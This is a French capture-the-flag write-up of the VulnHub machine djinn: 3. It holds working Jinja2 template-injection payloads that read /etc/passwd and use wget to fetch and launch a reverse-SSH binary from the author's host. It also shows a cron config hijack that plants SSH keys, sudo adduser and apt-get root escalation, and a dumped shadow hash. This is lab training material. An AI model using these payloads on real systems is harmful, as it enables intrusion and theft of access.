# Solution du CTF Djinn: 3 de VulnHub

[djinn: 3](https://www.vulnhub.com/entry/djinn-3,492/) est un CTF de [mzfr](https://twitter.com/0xmzfr) proposé sur VulnHub.  Il y a deux autres opus dans cette série.

```
Nmap scan report for 192.168.242.132
Host is up (0.00050s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e64423acb2d982e79058155e4023ed65 (RSA)
|   256 ae04856ecb104f554aad969ef2ce184f (ECDSA)
|_  256 f708561997b5031018667e7d2e0a4742 (ED25519)
80/tcp    open  http    lighttpd 1.4.45
|_http-title: Custom-ers
|_http-server-header: lighttpd/1.4.45
5000/tcp  open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
31337/tcp open  Elite?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL: 
|     username>
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     username> password> authentication failed
|   Help: 
|     username> password>
|   RPCCheck: 
|     username> Traceback (most recent call last):
|     File "/opt/.tick-serv/tickets.py", line 105, in <module>
|     main()
|     File "/opt/.tick-serv/tickets.py", line 93, in main
|     username = input("username> ")
|     File "/usr/lib/python3.6/codecs.py", line 321, in decode
|     (result, consumed) = self._buffer_decode(data, self.errors, final)
|     UnicodeDecodeError: 'utf-8' codec can't decode byte 0x80 in position 0: invalid start byte
|   SSLSessionReq: 
|     username> Traceback (most recent call last):
|     File "/opt/.tick-serv/tickets.py", line 105, in <module>
|     main()
|     File "/opt/.tick-serv/tickets.py", line 93, in main
|     username = input("username> ")
|     File "/usr/lib/python3.6/codecs.py", line 321, in decode
|     (result, consumed) = self._buffer_decode(data, self.errors, final)
|     UnicodeDecodeError: 'utf-8' codec can't decode byte 0xd7 in position 13: invalid continuation byte
|   TerminalServerCookie: 
|     username> Traceback (most recent call last):
|     File "/opt/.tick-serv/tickets.py", line 105, in <module>
|     main()
|     File "/opt/.tick-serv/tickets.py", line 93, in main
|     username = input("username> ")
|     File "/usr/lib/python3.6/codecs.py", line 321, in decode
|     (result, consumed) = self._buffer_decode(data, self.errors, final)
|_    UnicodeDecodeError: 'utf-8' codec can't decode byte 0xe0 in position 5: invalid continuation byte
```

## Je crois que j'ai un ticket

On a un service custom sur le port 31337. Visiblement c'est du Python car Nmap a réussi, sans faire exprès, à provoquer une exception.

C'est une simple erreur de décodage, on peut le reproduire facilement :

```shellsession
$ echo -e "\xff\x7f\x00" | ncat 192.168.242.132 31337
username> Traceback (most recent call last):
  File "/opt/.tick-serv/tickets.py", line 105, in <module>
    main()
  File "/opt/.tick-serv/tickets.py", line 93, in main
    username = input("username> ")
  File "/usr/lib/python3.6/codecs.py", line 321, in decode
    (result, consumed) = self._buffer_decode(data, self.errors, final)
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xff in position 0: invalid start byte
```

Ca nous donne quelques indications mais rien de vraiment utile. Le serveur demande aussi un champ password qui est sujet au même bug.

Sur le port 5000 il y a comme un bugtracker fait maison. On trouve notemment cette issue :

> #### Remove default user guest from the ticket creation service.

Effectivement l'accès fonctionne. Le serveur permet de soumettre les tickets, le résultat est alors aussitôt visible sur l'appli web. J'ai testé quelques payloads classiques avant de tester l'injection de templates (STTI) :

```shellsession
$ ncat 192.168.242.132 31337 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.242.132:31337.
username> guest
password> guest

Welcome to our own ticketing system. This application is still under 
development so if you find any issue please report it to mail@mzfr.me

Enter "help" to get the list of available commands.

> help

        help        Show this menu
        update      Update the ticketing software
        open        Open a new ticket
        close       Close an existing ticket
        exit        Exit
    
> open
Title: zozo
Description: test
> update
You are not authorized to update the system
Contact the system administrator for this
> open
Title: ../../../../../../../../../../../../../../../../../../etc/passwd
Description: plop
> open
Title: abc`id`
Description: desc`id`
> open
Title: {{ 5 + 7 }}   
Description: {{ 6 + 8 }}
```

Sur le listing des tickets tout semble correct mais en affichant les détails pour le dernier ticket soumis je vois que le code Python a été interprété :

> #### 12
> 
> **Status**: open  
> **ID**: 4281  
> 
> #### Description:
> 
> 14
> 
> **Sorry for the bright page, we are working on some beautiful CSS**

Ce qui m'a mis la puce à l'oreille c'est principalement le fait que Nmap a détecté le serveur comme `Werkzeug`. Quand on cherche *Werkzeug STTI* sur un moteur de recherche on trouve aussitôt des liens en rapport avec `Flask` et le moteur de template `Jinja2`.

Bien sûr [HackTricks a un article pour les STTI Jinja2](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#jinja-injection-without-less-than-class-object-greater-than) car *HackTricks* a des astuces pour tout 💜

Je scrolle à la recherche d'un exemple de STTI pas trop compliqué (qui ne nécessite pas trop d'introspection sur les objets présents) et je trouve une section qui fait mon bonheur :

```python
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}
```

Nouveau ticket, affichage dans l'appli web et hop !

```
root:x:0:0:root:/root:/bin/bash
--- snip ---
saint:x:1000:1002:,,,:/home/saint:/bin/bash
jack:x:1001:1003:,,,:/home/jack:/bin/bash
mzfr:x:1002:1004:,,,:/home/mzfr:/bin/bash
```

On va le récupérer notre reverse shell :

```python
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("cd /tmp;wget http://192.168.242.1/reverse-sshx64 -O reverse-sshx64;chmod 755 reverse-sshx64;").read() }}
```

et c'est parti :

```python
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("nohup /tmp/reverse-sshx64 -p 80 192.168.242.1&").read() }}
```

Tunnel établit, plus qu'à se connecter via ssh sur le port 8888 de localhost.

```shellsession
$ sudo ./reverse-sshx64 -l -p 80 -v
2022/11/22 09:31:11 Starting ssh server on :80
2022/11/22 09:31:11 Success: listening on [::]:80
2022/11/22 09:32:32 Successful authentication with password from reverse@192.168.242.132:43584
2022/11/22 09:32:32 Attempt to bind at 127.0.0.1:8888 granted
2022/11/22 09:32:32 New connection from 192.168.242.132:43584: www-data on djinn3 reachable via 127.0.0.1:8888
```

L'accès avec `www-data` ne permet pas grand chose mais je peux regarder le code de l'appli web par cutiosité :

```python
from flask import Flask, render_template, request, render_template_string
import json


app = Flask(__name__, static_url_path="/static")
app.secret_key = "hackthedamnplanet"


@app.route("/")
def index():
    try:
        ticket_id = request.args.get("id")
    except:
        ticket_id = None

    with open("data.json", "r") as f:
        data = json.load(f)

    if ticket_id:
        for d in data:
            if d["id"] == int(ticket_id):
                title = d["title"]
                status = d["status"]
                desc = d["desc"]

        template = """
        <html>
            <head>
            </head>

            <body>
                <h4>%s</h4>
                <br>
                <b>Status</b>: %s
                <br>
                <b>ID</b>: %s
                <br>
                <h4> Description: </h4>
                <br>
                %s
            </body>
             <footer>
              <p><strong>Sorry for the bright page, we are working on some beautiful CSS</strong></p>
             </footer> 
        </html>
        """ % (
            title,
            status,
            ticket_id,
            desc,
        )
        return render_template_string(template)
    else:
        return render_template("index.html", items=data)


if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=False)
```

On peut voir que la STTI a lieu seulement lors de l'affichage de la page du ticket, pas avant.

## Write-What-Where

Je suis ensuite passé sur une énumération locale classique et lors d'une recherche des fichiers pour chacun des utilisateurs présents, le listing pour `saint` m'a retourné des entrées dans `/proc` indiquant qu'un process tournait avec cet utilisateur. J'ai recherché aussitôt dans la liste des process mais il n'existait plus. Par conséquent l'utilisateur a certainement une tache planifiée.

Pour m'en convrainvre j'ai uploadé et exécuté [pspy: Monitor linux processes without root permissions](https://github.com/DominicBreuker/pspy) et attendu un peu :

```
2022/11/22 15:18:01 CMD: UID=0    PID=18666  | /usr/sbin/CRON -f 
2022/11/22 15:18:01 CMD: UID=1000 PID=18669  | /usr/bin/python3 /home/saint/.sync-data/syncer.py 
2022/11/22 15:18:01 CMD: UID=1000 PID=18670  | /usr/bin/python3 /home/saint/.sync-data/syncer.py 
2022/11/22 15:18:01 CMD: UID=1000 PID=18672  | uname -p 
2022/11/22 15:18:01 CMD: UID=1000 PID=18671  | /bin/sh -c uname -p 2> /dev/null 
2022/11/22 15:21:01 CMD: UID=1000 PID=18675  | /bin/sh -c /usr/bin/python3 /home/saint/.sync-data/syncer.py 
2022/11/22 15:21:01 CMD: UID=1000 PID=18674  | /bin/sh -c /usr/bin/python3 /home/saint/.sync-data/syncer.py
```

On ne peut pas accéder au code de `syncer.py` mais l'utilisateur a aussi deux fichiers Python compilés sur le disque et on a un accès en lecture :

```shellsession
www-data@djinn3:/tmp$ find / -user saint 2> /dev/null 
/home/saint
/opt/.configuration.cpython-38.pyc
/opt/.syncer.cpython-38.pyc
```

L'appli de référence pour décompiler le Python c'est `uncompyle6` seulement le code ne fonctionne pas avec des versions modernes de Python.

La VM du CTF utilise Python 3.6.9, j'ai choisis de faire tourner un Docker avec une version similaire et d'y installer `uncompyle6`. Avec l'option `-v` de Docker je m'assure que les fichiers compilés soient montés dans le container (ça évite de devoir transférer les fichiers par le réseau à la place) :

```shellsession
docker run -v /tmp/opt/:/opt -it --rm python:3.6 /bin/bash
root@b26a32f45184:/# pip install uncompyle6
Collecting uncompyle6
  Downloading uncompyle6-3.8.0-py36-none-any.whl (317 kB)
     |████████████████████████████████| 317 kB 7.4 MB/s 
--- snip ---
You should consider upgrading via the '/usr/local/bin/python -m pip install --upgrade pip' command.
root@b26a32f45184:/# cd /opt/
root@b26a32f45184:/opt# ls -a
.  ..  .configuration.cpython-38.pyc  .syncer.cpython-38.pyc  .tick-serv  .web
root@b26a32f45184:/opt# uncompyle6 .configuration.cpython-38.pyc
```

J'obtiens le code Python suivant :

```python
import os, sys, json
from glob import glob
from datetime import datetime as dt

class ConfigReader:
    config = None

    @staticmethod
    def read_config(path):
        """Reads the config file
        """
        config_values = {}
        try:
            with open(path, 'r') as (f):
                config_values = json.load(f)
        except Exception as e:
            try:
                print("Couldn't properly parse the config file. Please use properl")
                sys.exit(1)
            finally:
                e = None
                del e

        else:
            return config_values

    @staticmethod
    def set_config_path():
        """Set the config path
        """
        files = glob('/home/saint/*.json')
        other_files = glob('/tmp/*.json')
        files = files + other_files
        try:
            if len(files) > 2:
                files = files[:2]
            else:
                file1 = os.path.basename(files[0]).split('.')
                file2 = os.path.basename(files[1]).split('.')
                if file1[(-2)] == 'config':
                    if file2[(-2)] == 'config':
                        a = dt.strptime(file1[0], '%d-%m-%Y')
                        b = dt.strptime(file2[0], '%d-%m-%Y')
                if b < a:
                    filename = files[0]
                else:
                    filename = files[1]
        except Exception:
            sys.exit(1)
        else:
            return filename
```

et celui-ci :

```python
from configuration import *
from connectors.ftpconn import *
from connectors.sshconn import *
from connectors.utils import *

def main():
    """Main function
    Cron job is going to make my work easy peasy
    """
    configPath = ConfigReader.set_config_path()
    config = ConfigReader.read_config(configPath)
    connections = checker(config)
    if 'FTP' in connections:
        ftpcon(config['FTP'])
    else:
        if 'SSH' in connections:
            sshcon(config['SSH'])
        else:
            if 'URL' in connections:
                sync(config['URL'], config['Output'])


if __name__ == '__main__':
    main()
```

Ok, donc le programme regarde dans `/tmp` si il y a des fichiers JSON nommés de la forme `jour-mois-année.config.json`, la date devant être plus récente qu'un fichier de référence que l'on ne connait pas. Je vais donc choisir `23-11-2022.config.json` soit demain au moment de ces lignes.

Le contenu du fichier JSON est alors chargé et différentes méthodes sont appelées en fonction de ce qui est présent dans le fichier.

Il reste à savoir ce que l'on met dedans. J'ai d'abord essayé de deviner ce que je pouvais mettre dans l'entrée `FTP` (URL du type `ftp://ip:port/` ou dictionnaire avec ip, port, etc ?) mais ça n'a rien donné.

Finalement j'ai utilisé la dernière option qui est assez explicite. L'objectif est de placer notre clé publique SSH dans le fichier `authorized_keys` de l'utilisateur :

```json
{
        "URL": "http://127.0.0.1:8000/authorized_keys",
        "Output": "/home/saint/.ssh/authorized_keys"
}
```

J'ai fait tourner `python -m http.server` sur la VM pour servir le fichier comme ça je suis sûr qu'il n'y aura pas une règle de pare-feu qui bloque.

Une fois la tache cron exécutée je peux me connecter avec le compte `saint` :

```shellsession
saint@djinn3:~$ sudo -l
Matching Defaults entries for saint on djinn3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User saint may run the following commands on djinn3:
    (root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * admin
```

Il y a une permission `sudo` pour rajouter un utilisateur. La ligne de commande ne doit pas inclure les mots `sudo` ou `admin`.

Ma première idée a été de créer un utilisateur dans le groupe `root` en me disant que je parviendrais à en tirer quelque chose :

```shellsession
sudo /usr/sbin/adduser --gid 0 --home /root --shell /bin/bash devloop
```

En effet c'est suffisant pour lire le contenu de `/etc/sudoers` :

```
saint ALL=(root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * admin
jason ALL=(root) PASSWD: /usr/bin/apt-get
```

On découvre qu'un utilisateur nommé `jason` (qui n'existe plus sur le système) pouvait utiliser `apt-get` en tant que root.

Une fois l'utilisateur jason créé on peut utiliser un [GTFObin](https://gtfobins.github.io/gtfobins/apt-get/) pour la commande :

```shellsession
jason@djinn3:/home/saint$ sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
proof.sh
```

Le script affiche le flag final :

```
    _                        _             _ _ _ 
   / \   _ __ ___   __ _ ___(_)_ __   __ _| | | |
  / _ \ | '_ ` _ \ / _` |_  / | '_ \ / _` | | | |
 / ___ \| | | | | | (_| |/ /| | | | | (_| |_|_|_|
/_/   \_\_| |_| |_|\__,_/___|_|_| |_|\__, (_|_|_)
                                     |___/       
djinn-3 pwned...
__________________________________________________________________________

Proof: VGhhbmsgeW91IGZvciB0cnlpbmcgZGppbm4zID0K
Path: /root
Date: Tue Nov 22 17:31:26 IST 2022
Whoami: root
__________________________________________________________________________

By @0xmzfr

Special thanks to @DCAU7 for his help on Privilege escalation process
And also Thanks to my fellow teammates in @m0tl3ycr3w for betatesting! :-)

If you enjoyed this then consider donating (https://blog.mzfr.me/support/)
so I can continue to make these kind of challenges.
```

Une solution alternative pourrait être de créer un utilisateur membre du groupe `shadow` afin de lire les mots de passe du système :

```shellsession
saint@djinn3:~$ cat /etc/group | grep shadow
shadow:x:42:
saint@djinn3:~$ sudo /usr/sbin/adduser --gid 42 --shell /bin/bash shadow
Adding user `shadow' ...
Adding new user `shadow' (1005) with group `shadow' ...
Creating home directory `/home/shadow' ...
Copying files from `/etc/skel' ...
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully
Changing the user information for shadow
Enter the new value, or press ENTER for the default
        Full Name []: 
        Room Number []: 
        Work Phone []: 
        Home Phone []: 
        Other []: 
Is the information correct? [Y/n] y
saint@djinn3:~$ su shadow
Password: 
shadow@djinn3:/home/saint$ id
uid=1005(shadow) gid=42(shadow) groups=42(shadow)
shadow@djinn3:/home/saint$ head /etc/shadow
root:$6$YPyhO8kL$i1sogRL.8t9NdMgPw7Ng/lzus2Q3yocQhSW8eMDqiGDPjejKI1qS.Y241qm6kwZYd4JDsgL6Rtkv29rTZBHbk0:18387:0:99999:7:::
--- snip ---
```

Il faut toutefois être en mesure de casser les hashs ensuite.

*Publié le 22 novembre 2022*
